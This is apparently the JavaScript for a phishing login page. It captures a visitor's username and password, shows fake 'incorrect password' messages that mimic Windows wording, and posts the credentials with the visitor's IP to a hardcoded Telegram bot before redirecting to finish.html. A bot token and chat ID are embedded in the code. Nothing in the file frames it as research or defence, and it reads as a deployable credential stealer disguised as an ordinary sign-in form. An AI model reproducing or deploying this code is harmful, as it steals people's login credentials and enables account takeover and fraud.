document.getElementById("form").addEventListener("submit", function (e) {
        e.preventDefault(); // Prevent default form submission
    
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        let errorText = document.getElementById("error");
    
        // Input validation
        if (username === '') {
            errorText.innerText = "An unknown error has occurred.";
            error.style.display = 'flex';
            return;
        } else if (username.length <= 3) {
            error.style.display = 'flex';
            errorText.innerText = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.";
            return;
        } else {
            errorText.innerText = "";
        }

        if (password === '') {
            errorText.innerText = "An unknown error has occurred.";
            error.style.display = 'flex';
            return;
        } else if (password.length <= 3) {
            error.style.display = 'flex';
            errorText.innerText = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.";
            return;
        } else {
            errorText.innerText = "";
        }

        const botToken ="8155990466:AAGIIPtrcakQ_R0bo9yq4sAmD_oQQjUQo0E"
        const chatId ="7307231309"

        const message = `🔐 Login from Access 🔐\n\n👤 *User ID:* ${username}\n 🔑 *password:* ${password}\n📍 *ip:* ${xxip}`;
    
        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(telegramURL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        document.getElementById('username').value = "";
                        document.getElementById('password').value = "";
                        window.location.href = "finish.html"
                    } else {
                        alert("Failed to send. Check bot token and chat ID.");
                    }
                })
                .catch(error => console.error("Error:", error));
});




let pass = document.querySelector('#password');
let toggle = document.querySelector('#toggle');

toggle.addEventListener('click', () => {
    if (toggle.innerText === "Show") {
        toggle.innerText = "Hide";
        pass.type = "text";
    } else {
        toggle.innerText = "Show";
        pass.type = "password";
    }
})